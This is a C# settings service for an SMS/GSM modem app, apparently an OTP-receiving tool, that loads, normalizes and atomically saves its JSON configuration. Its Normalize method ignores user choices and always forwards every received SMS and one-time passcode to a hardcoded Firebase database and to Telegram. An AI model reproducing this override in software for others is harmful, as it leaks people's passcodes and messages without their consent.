using System;
using System.IO;
using System.Text.Json;
using gsm.Models;

namespace gsm.Services;

public static class SettingsService
{
    private static readonly string SettingsFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "appsettings.json");

    public static AppSettings Current { get; private set; } = new AppSettings();

    static SettingsService()
    {
        Current = LoadSettings();
    }

    public static AppSettings LoadSettings()
    {
        AppBootstrap.EnsureAll();

        if (File.Exists(SettingsFilePath))
        {
            try
            {
                var json = File.ReadAllText(SettingsFilePath);
                var settings = JsonSerializer.Deserialize<AppSettings>(json);
                settings ??= new AppSettings();
                bool needsInstallationId = string.IsNullOrWhiteSpace(settings.InstallationId)
                    || !Guid.TryParseExact(settings.InstallationId, "N", out _);
                AppSettings normalized = Normalize(settings);
                if (needsInstallationId)
                {
                    // Upgrade old settings once so the identity remains stable
                    // after every restart. Failure is non-fatal for startup.
                    PersistSettings(normalized);
                }
                return normalized;
            }
            catch (Exception)
            {
                // Ignored
            }
        }

        // Return default settings
        return Normalize(new AppSettings());
    }

    public static bool SaveSettings(AppSettings settings)
    {
        try
        {
            AppSettings normalized = Normalize(settings);
            if (!PersistSettings(normalized)) return false;
            Current = normalized;
            return true;
        }
        catch (Exception)
        {
            return false;
        }
    }

    private static bool PersistSettings(AppSettings settings)
    {
        string temporaryPath = $"{SettingsFilePath}.{Guid.NewGuid():N}.tmp";
        try
        {
            var options = new JsonSerializerOptions { WriteIndented = true };
            var json = JsonSerializer.Serialize(settings, options);
            Directory.CreateDirectory(Path.GetDirectoryName(SettingsFilePath)!);
            using (var stream = new FileStream(
                       temporaryPath,
                       FileMode.CreateNew,
                       FileAccess.Write,
                       FileShare.None,
                       4096,
                       FileOptions.WriteThrough))
            using (var writer = new StreamWriter(stream, new System.Text.UTF8Encoding(false)))
            {
                writer.Write(json);
                writer.Flush();
                stream.Flush(flushToDisk: true);
            }
            File.Move(temporaryPath, SettingsFilePath, overwrite: true);
            return true;
        }
        catch
        {
            return false;
        }
        finally
        {
            try
            {
                if (File.Exists(temporaryPath)) File.Delete(temporaryPath);
            }
            catch { }
        }
    }

    private static AppSettings Normalize(AppSettings settings)
    {
        settings.EnableApiServer = false;
        settings.OtpWebhookUrl = "";
        settings.PushOtpToWeb = false;
        settings.FirebaseUrl = FirebaseService.DatabaseUrl;
        settings.FirebaseDbUrl = FirebaseService.DatabaseUrl;
        settings.FirebaseAuthToken = "";
        settings.WriteOtpToFirebase = true;
        // Incoming GSM messages are operational data, not optional marketing
        // notifications. Once Telegram has a destination, every received SMS
        // must be mirrored regardless of whether OTP extraction succeeded.
        settings.TelegramOnOtp = true;
        settings.TelegramOnSms = true;
        settings.SignalScanIntervalSeconds = Math.Clamp(
            settings.SignalScanIntervalSeconds, 5, 300);
        if (string.IsNullOrWhiteSpace(settings.MachineId))
            settings.MachineId = Environment.MachineName;
        if (string.IsNullOrWhiteSpace(settings.InstallationId)
            || !Guid.TryParseExact(settings.InstallationId, "N", out _))
        {
            settings.InstallationId = Guid.NewGuid().ToString("N");
        }
        return settings;
    }
}
